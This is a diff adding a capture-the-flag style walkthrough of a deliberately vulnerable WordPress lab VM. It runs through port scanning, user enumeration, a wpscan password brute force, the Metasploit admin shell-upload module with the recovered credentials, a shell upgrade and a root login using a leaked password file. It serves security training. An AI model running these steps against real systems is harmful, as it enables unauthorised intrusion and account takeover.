@@ -1,1 +1,219 @@
-ASDASDD
+Lets start off with this machine.
+Its a simple machine and hints are on the way.
+IP : 10.0.2.105
+
+
+First we will start off by scanning the ports.
+
+nmap -sC -sV -p- 10.0.2.105
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-18 05:33 EST
+Nmap scan report for 10.0.2.105
+Host is up (0.000097s latency).
+Not shown: 65528 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
+|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
+|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
+53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES UIDL AUTH-RESP-CODE SASL PIPELINING CAPA TOP
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: IDLE ID more have capabilities IMAP4rev1 listed LITERAL+ LOGIN-REFERRALS post-login Pre-login ENABLE LOGINDISABLEDA0001 OK SASL-IR
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 08:00:27:FD:B5:B2 (Oracle VirtualBox virtual NIC)
+Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
+|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
+|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
+|   Domain name: \x00
+|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
+|_  System time: 2021-11-18T05:34:06-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-11-18T10:34:06
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.85 seconds
+
+We found a lot of ports opened now lets try to enumerate all of them one by one.
+As you can see ssh is open so if we tend to exploit any username or password we can try to login through it.
+
+
+Let's Go!!!
+
+As you can see, we have a site, let's dig deep using gobuster 
+
+gobuster dir -u http://10.0.2.105 -x html,txt,php,bak,js --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.105
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,bak,js,html
+[+] Timeout:                 10s
+===============================================================
+2021/11/18 05:55:23 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 10821]
+/info.php             (Status: 200) [Size: 83102]
+/wordpress            (Status: 301) [Size: 312] [--> http://10.0.2.105/wordpress/]
+Progress: 56910 / 1323366 (4.30%)                                                ^C
+[!] Keyboard interrupt detected, terminating.
+                                                                                  
+===============================================================
+2021/11/18 05:55:30 Finished
+===============================================================
+
+We found a directory named wordpress : /wordpress
+
+I will use wpscan tool for username and password :
+
+wpscsan --url http://10.0.2.105/wordpress --enumerate u 
+
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.18
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.0.2.105/wordpress/ [10.0.2.105]
+[+] Started: Thu Nov 18 05:38:36 2021
+
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.0.2.105/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.0.2.105/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.0.2.105/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.0.2.105/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.0.2.105/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.4'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.0.2.105/wordpress/, Match: 'WordPress 5.2.4'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <==========================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] c0rrupt3d_brain
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+
+We got the username, now it's time for the password 
+USERNAME : c0rrupt3d_brain
+
+wpscan --url http://10.0.2.105/wordpress -U c0rrupt3d_brain -P /rockyou.txt
+
+
+[!] Valid Combinations Found:
+ | Username: c0rrupt3d_brain, Password: 24992499
+ 
+ Now we got my password too
+ PASSWORD : 24992499
+
+Exploitation
+Now that we know username and password, we can use an inbuilt wordpress exploit from Metasploit. Firstly, start Metasploit by typing ‘msfconsole’ and the type the following command:
+
+use exploit/unix/webapp/wp_admin_shell_upload
+set rhosts 10.0.2.105
+set targeturi /wordpress
+set username c0rrupt3d_brain
+set password 24992499
+exploit
+
+And we hacked the system
+
+Use these commands:
+1- shell
+2- id : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+3- whoami: www-data
+4- python3 -c 'import pty;pty.spawn("/bin/bash")'
+5- export TERM=term
+6- cd /home
+7- ls -la
+8- cd root3r
+9- ls -la
+10- -rw-r--r-- 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt
+-rw-r--r-- 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful
+-rw-r--r-- 1 root     root        4 Nov  1  2019 test.txt
+11- cat .root_password_ssh.txt
+
+Root password is willy26
+
+12- su root
+Password: willy26
+
+
+
+
+
+
+
+
